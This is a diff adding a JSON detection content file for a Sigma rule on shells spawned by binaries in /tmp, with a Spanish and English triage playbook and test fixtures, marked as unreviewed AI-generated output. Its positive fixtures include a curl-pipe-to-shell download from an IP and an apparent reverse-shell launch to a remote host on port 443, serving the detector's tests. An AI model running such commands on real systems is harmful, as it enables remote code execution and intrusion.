@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "2fade0b6-7423-4835-9d4f-335b39b83867",
+    "title": "Shell Execution Of Process Located In Tmp Directory",
+    "level": "high",
+    "status": "test",
+    "author": "Joseliyo Sanchez, @Joseliyo_Jstnk",
+    "path": "linux/process_creation/proc_creation_lnx_susp_shell_child_process_from_parent_tmp_folder.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_susp_shell_child_process_from_parent_tmp_folder.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un ejecutable ubicado en /tmp inició un shell (bash, sh, dash, zsh, ksh, csh o fish). Los binarios que corren desde /tmp y abren shells suelen indicar malware o un payload descargado que ejecuta comandos.",
+      "what_it_detects": "Eventos de creación de procesos en Linux donde ParentImage empieza con '/tmp/' e Image termina en /bash, /csh, /dash, /fish, /ksh, /sh o /zsh. En otras palabras, un binario que se ejecuta desde /tmp está iniciando un intérprete de comandos.",
+      "why_it_matters": "Los atacantes dejan sus payloads en /tmp porque cualquier usuario puede escribir allí. Luego usan un shell para ejecutar comandos, descargar más herramientas o crear persistencia (ATT&CK Execution, T1059.004 Unix Shell). Las referencias de la regla describen este patrón en GobRAT, un RAT para Linux.",
+      "triage_steps": [
+        "Revise ParentImage y ParentCommandLine. Fíjese en nombres aleatorios u ocultos (que empiezan con punto) y en argumentos extraños. Anote el usuario y el PID del proceso padre.",
+        "Revise el CommandLine del shell hijo. Busque descargas (curl, wget), comandos codificados, cambios en crontab, systemd o authorized_keys y comandos de reconocimiento.",
+        "Obtenga el hash del binario padre y búsquelo en su inteligencia de amenazas. Averigüe su origen: cuándo se creó y qué proceso o usuario lo escribió en /tmp.",
+        "Arme el árbol de procesos del host en una ventana de +/- 15 minutos. Identifique el abuelo del proceso (servicio web, sshd, cron) y todos los hijos del shell.",
+        "Busque conexiones de red del proceso padre y del shell. Compare los destinos con el tráfico habitual del host.",
+        "Busque el mismo ParentImage o el mismo hash en otros hosts. Revise también alertas anteriores del mismo host y del mismo usuario."
+      ],
+      "false_positives": [
+        "Instaladores autoextraíbles (.run, makeself) o scripts de proveedores que se descomprimen en /tmp y ejecutan pasos con sh o bash.",
+        "Binarios compilados o probados por desarrolladores en /tmp, o jobs de CI/CD que usan /tmp como directorio de trabajo."
+      ],
+      "response_steps": [
+        "Confirme la actividad con el dueño del sistema. Antes de matar el proceso, guarde el binario de /tmp, su hash y la memoria del proceso. No reinicie el host: /tmp puede borrarse al arrancar.",
+        "Si se confirma que es malicioso, aísle el host de la red y termine los procesos padre e hijo.",
+        "Revise los mecanismos de persistencia: cron, unidades de systemd, rc.local, perfiles de shell y authorized_keys. Elimine solo lo que haya verificado como malicioso.",
+        "Rote las credenciales que hayan estado expuestas en el host. Bloquee los IOC de red y de hash, y reconstruya el host si quedó comprometido."
+      ],
+      "severity_rationale": "El nivel alto se justifica porque un shell iniciado por un binario de /tmp casi nunca es legítimo en servidores y coincide con el comportamiento de malware documentado."
+    },
+    "en": {
+      "summary": "An executable located in /tmp started a shell (bash, sh, dash, zsh, ksh, csh or fish). Binaries that run from /tmp and spawn shells often indicate malware or a dropped payload running commands.",
+      "what_it_detects": "Linux process creation events where ParentImage starts with '/tmp/' and Image ends with /bash, /csh, /dash, /fish, /ksh, /sh or /zsh. In other words, a binary running from /tmp is launching a shell interpreter.",
+      "why_it_matters": "Attackers drop payloads in /tmp because any user can write there. They then use a shell to run commands, fetch more tools or set up persistence (ATT&CK Execution, T1059.004 Unix Shell). The rule's references describe this pattern in GobRAT, a Linux RAT.",
+      "triage_steps": [
+        "Review ParentImage and ParentCommandLine. Look for random or hidden (dot-prefixed) names and odd arguments. Note the user and the parent PID.",
+        "Review the child shell's CommandLine. Look for downloads (curl, wget), encoded commands, changes to crontab, systemd or authorized_keys, and reconnaissance commands.",
+        "Get the hash of the parent binary and check it against threat intel. Find its origin: when it was created and which process or user wrote it to /tmp.",
+        "Build the host's process tree for +/- 15 minutes. Identify the grandparent (web service, sshd, cron) and every child of the shell.",
+        "Look for network connections from the parent process and the shell. Compare the destinations with the host's normal traffic.",
+        "Search for the same ParentImage or hash on other hosts. Also check earlier alerts for the same host and the same user."
+      ],
+      "false_positives": [
+        "Self-extracting installers (.run, makeself) or vendor setup scripts that unpack into /tmp and run steps with sh or bash.",
+        "Binaries that developers compile or test in /tmp, or CI/CD jobs that use /tmp as a working directory."
+      ],
+      "response_steps": [
+        "Confirm the activity with the system owner. Before killing the process, save the /tmp binary, its hash and the process memory. Do not reboot the host: /tmp may be cleared at boot.",
+        "If it is confirmed malicious, isolate the host from the network and terminate the parent and child processes.",
+        "Check persistence mechanisms: cron, systemd units, rc.local, shell profiles and authorized_keys. Remove only what you have verified as malicious.",
+        "Rotate any credentials exposed on the host. Block the network and hash IOCs, and rebuild the host if it was compromised."
+      ],
+      "severity_rationale": "High fits because a shell started by a binary in /tmp is rarely legitimate on servers and matches documented malware behavior."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Hidden binary in /tmp spawns /bin/sh to download and run a script",
+        "event": {
+          "Computer": "web-srv-03",
+          "User": "www-data",
+          "ProcessId": 48213,
+          "Image": "/bin/sh",
+          "CommandLine": "sh -c curl -s http://198.51.100.23/upd.sh | sh",
+          "ParentProcessId": 48190,
+          "ParentImage": "/tmp/.cache/zone",
+          "ParentCommandLine": "/tmp/.cache/zone -d"
+        }
+      },
+      {
+        "description": "Binary in /tmp launches an interactive bash",
+        "event": {
+          "Computer": "bastion-01",
+          "User": "jperez",
+          "ProcessId": 7731,
+          "Image": "/usr/bin/bash",
+          "CommandLine": "/usr/bin/bash -i",
+          "ParentProcessId": 7702,
+          "ParentImage": "/tmp/kworkerd",
+          "ParentCommandLine": "/tmp/kworkerd 203.0.113.50 443"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Shell spawned by a parent in /var/tmp, which does not start with '/tmp/'",
+        "event": {
+          "Computer": "build-02",
+          "User": "ci-runner",
+          "ProcessId": 5120,
+          "Image": "/bin/bash",
+          "CommandLine": "bash ./configure",
+          "ParentProcessId": 5101,
+          "ParentImage": "/var/tmp/build/make",
+          "ParentCommandLine": "/var/tmp/build/make all"
+        }
+      },
+      {
+        "description": "Binary in /tmp runs curl, not a shell",
+        "event": {
+          "Computer": "WS-0142",
+          "User": "mlopez",
+          "ProcessId": 9344,
+          "Image": "/usr/bin/curl",
+          "CommandLine": "curl -O https://downloads.example.com/agent.tar.gz",
+          "ParentProcessId": 9330,
+          "ParentImage": "/tmp/installer/setup",
+          "ParentCommandLine": "/tmp/installer/setup --quiet"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:55:13+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
